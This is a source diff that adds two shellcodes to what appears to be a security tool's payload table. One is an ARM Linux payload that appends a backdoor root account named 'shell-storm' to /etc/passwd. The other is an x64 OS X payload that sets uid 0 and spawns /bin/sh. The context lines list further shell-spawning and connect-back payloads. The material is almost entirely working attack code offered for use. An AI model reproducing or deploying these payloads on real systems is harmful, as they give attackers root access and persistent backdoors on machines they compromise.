@@ -777,6 +777,75 @@ char x86_ppc_osx_binsh[] =
 "\xff\xff\xff\x2b\xff\xe8\xe3\xff\xff"
 "\xff/bin/shX";
 
+/* by Jonathan Salwan
+ * http://shell-storm.org/shellcode/files/shellcode-735.php
+ */
+char arm_linux_adduser[] =
+	/* Thumb mode */
+	"\x05\x50\x45\xe0"  /* sub  r5, r5, r5 */
+	"\x01\x50\x8f\xe2"  /* add  r5, pc, #1 */
+	"\x15\xff\x2f\xe1"  /* bx   r5 */
+
+	/* open("/etc/passwd", O_WRONLY|O_CREAT|O_APPEND, 0644) = fd */
+	"\x78\x46"          /* mov  r0, pc */
+	"\x7C\x30"          /* adds r0, #124 */
+	"\xff\x21"          /* movs r1, #255 */
+	"\xff\x31"          /* adds r1, #255 */
+	"\xff\x31"          /* adds r1, #255 */
+	"\xff\x31"          /* adds r1, #255 */
+	"\x45\x31"          /* adds r1, #69 */
+	"\xdc\x22"          /* movs r2, #220 */
+	"\xc8\x32"          /* adds r2, #200 */
+	"\x05\x27"          /* movs r7, #5 */
+	"\x01\xdf"          /* svc  1 */
+
+	/* r8 = fd */
+	"\x80\x46"          /* mov  r8, r0 */
+
+	/* write(fd, "shell-storm:$1$KQYl/yru$PMt02zUTW"..., 72) */
+	"\x41\x46"          /* mov  r1, r8 */
+	"\x08\x1c"          /* adds r0, r1, #0 */
+	"\x79\x46"          /* mov  r1, pc */
+	"\x18\x31"          /* adds r1, #24 */
+	"\xc0\x46"          /* nop (mov r8, r8) */
+	"\x48\x22"          /* movs r2, #72 */
+	"\x04\x27"          /* movs r7, #4 */
+	"\x01\xdf"          /* svc  1 */
+
+	/* close(fd) */
+	"\x41\x46"          /* mov  r1, r8 */
+	"\x08\x1c"          /* adds r0, r1, #0 */
+	"\x06\x27"          /* movs r7, #6 */
+	"\x01\xdf"          /* svc  1 */
+
+	/* exit(0) */
+	"\x1a\x49"          /* subs r1, r1, r1 */
+	"\x08\x1c"          /* adds r0, r1, #0 */
+	"\x01\x27"          /* movs r7, #1 */
+	"\x01\xdf"          /* svc  1 */
+
+	/* shell-storm:$1$KQYl/yru$PMt02zUTWmMvPWcU4oQLs/:0:0:root:/root:/bin/bash\n */
+	"\x73\x68\x65\x6c\x6c\x2d\x73\x74\x6f\x72"
+	"\x6d\x3a\x24\x31\x24\x4b\x51\x59\x6c\x2f"
+	"\x79\x72\x75\x24\x50\x4d\x74\x30\x32\x7a"
+	"\x55\x54\x57\x6d\x4d\x76\x50\x57\x63\x55"
+	"\x34\x6f\x51\x4c\x73\x2f\x3a\x30\x3a\x30"
+	"\x3a\x72\x6f\x6f\x74\x3a\x2f\x72\x6f\x6f"
+	"\x74\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73"
+	"\x68\x0a"
+
+	/* /etc/passwd */
+	"\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64";
+
+/* by Dustin Schultz
+ * http://shell-storm.org/shellcode/files/shellcode-736.php
+ */
+char x64_osx_suidsh[] =
+	"\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17\x31\xff\x4c\x89\xc0"
+	"\x0f\x05\xeb\x12\x5f\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x52"
+	"\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff\x2f\x62\x69\x6e\x2f"
+	"\x2f\x73\x68";
+
 
 
 #define ENTRY(a,b,c,x,y,z) { .name=x, .desc=z, .data=(unsigned char *)&y, .len=sizeof(y)-1, \
@@ -784,6 +853,7 @@ char x86_ppc_osx_binsh[] =
 #define ENTRY_NULL() { NULL, NULL, NULL, 0 }
 
 struct shellcode_t shellcodes[] = {
+ ENTRY(0,0,0,"arm.linux.adduser",     arm_linux_adduser,        "Adds root user 'shell-storm' with password 'toor'" )
  ENTRY(0,0,0,"arm.linux.binsh",       arm_linux_binsh,          "Runs /bin/sh" )
  ENTRY(0,0,0,"arm.linux.thumb",       arm_linux_thumb,          "Runs /bin/sh using thumb mode trick" )
  ENTRY(0,0,0,"arm.linux.suidsh",      arm_linux_suidsh,         "Setuid and runs /bin/sh" )
@@ -805,6 +875,7 @@ struct shellcode_t shellcodes[] = {
  ENTRY(0,0,0,"sparc.linux.connect",  sparc_linux_javicoder_connect,     "Connects to 10.12.34.3 : 1124")
  //ENTRY(0,0,0,"ia64.linux.binsh",      ia64_linux_binsh,         "Executes /bin/sh on Intel Itanium" )
  ENTRY(0,0,0,"x64.linux.binsh",       x64_linux_binsh,          "Runs /bin/sh on 64 bits" )
+ ENTRY(0,0,0,"x64.osx.suidsh",		  x64_osx_suidsh,			"Setuid(0) and runs /bin/sh")
  ENTRY(0,0,0,"x86.bsd.binsh",         x86_bsd_binsh,            "Executes /bin/sh" )
  ENTRY(0,0,0,"x86.bsd.binsh2",        x86_bsd_binsh2,           "Executes /bin/sh" )
  ENTRY(0,0,0,"x86.bsd.suidsh",        x86_bsd_suidsh,           "Setuid(0) and runs /bin/sh" )
